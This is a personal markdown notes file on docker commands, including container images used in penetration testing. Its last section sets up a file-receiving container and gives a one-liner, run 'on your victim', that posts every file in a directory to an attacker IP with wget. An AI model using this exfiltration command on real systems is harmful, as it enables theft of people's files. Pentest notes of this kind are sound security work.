# docker

## Common docker commands

Find the IP address of a container:

``` bash
docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container_name_or_id>
```

## Docker for pentesters

### Inspiration

* this [excellent post](https://blog.ropnop.com/docker-for-pentesters/) from ropnop.
* one good example in [this article](https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794) from 0x00sec.

### alpyntest

See [here](https://github.com/yaap7/miSCripts/tree/master/alpyntest).

### CyberChef Container

[Online example](https://gchq.github.io/CyberChef/)

``` bash
docker pull remnux/cyberchef
```

### Etherpad-lite Container

``` bash
docker pull etherpad/etherpad-lite:lastest
```

### postfiledumphere

Just a memo of [this article](https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794) from 0x00sec.

``` bash
alias postfiledumphere='docker run --rm -it -p80:3000 -v "${PWD}:/data" rflathers/postfiledump'  
```

Then, your system will listen on port 80, ready to receive files from your victim.
On your victim, you just need wget or curl, and this oneliner:

``` bash
ls | xargs -I{} wget http://10.10.14.3/{} --post-file {}
```
